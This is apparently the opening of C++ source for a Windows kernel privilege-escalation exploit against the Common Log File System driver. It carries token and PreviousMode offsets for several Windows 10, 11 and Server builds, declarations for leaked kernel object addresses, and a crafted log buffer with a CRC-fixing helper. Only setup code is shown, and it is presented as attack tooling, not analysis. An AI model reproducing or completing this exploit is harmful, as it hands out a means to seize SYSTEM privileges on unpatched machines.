//
//
#pragma warning (disable : 4005)
#pragma warning(disable:28159)

#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <clfsw32.h>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include "ntos.h"
#include "crc32.h"

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Clfsw32.lib")

BYTE g_Agent[0x2000] = { 'C' , 'A' , 'F' , 'E' , 'C' , 'A' , 'F' , 'E' };

/*
/*
Windows Server 2016 Standard ------>
Windows Server 2019 Standard ------> 17763 token offset: 0x358 decimal: 856
Windows Server 2022 Standard ------> 20348 token offset: 0x4b8 decimal: 1208
Windows 10 Pro Version 21H1 -------> 19041 19043 offset: 0x4b8 decimal: 1208
Windows 10 Pro Version 21H2 -------> 19041 offset: 0x4b8  decimal: 1208
Windows 11 Pro Version 21H2 -------> 22000 token offset: 0x4b8  decimal: 1208
*/

VOID FindKernelModulesBase();

//
// NT syscalls
//
#define SystemModuleInformation  0xb
#define SystemHandleInformation 0x10
int crcCalculatorAndFix(char*, int);

typedef struct _SYSTEM_BIGPOOL_ENTRY {
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	SIZE_T SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;


typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;


typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

_NtQuerySystemInformation fnNtQuerySystemInformation = NULL;
_NtWriteVirtualMemory fnNtWriteVirtualMemory = NULL;

//
// Leaked addresses
//
DWORD64 g_EProcessAddress = 0;
DWORD64 g_EThreadAddress = 0;
DWORD64 g_PreviousModeAddress;
DWORD64 g_TokenAddress, my_pidEprocess = 0;

//
// Version dependent offsets
//
#define OFFSET_OF_PREVIOUS_MODE 0x232
#define OFFSET_OF_WIN32PROCESS 0x3b0
#define OFFSET_OF_SEP_TOKEN_PRIVILEGES 0x40
#define OFFSET_OF_DCOMPOSITIONPROCESS 0x100


//
// CInteractionTrackerMarshaler object offsets
//
#define OFFSET_OF_FUNCTION 0x50
#define OBJECT_SIZE 0x1a0
typedef NTSTATUS func(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS func3(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);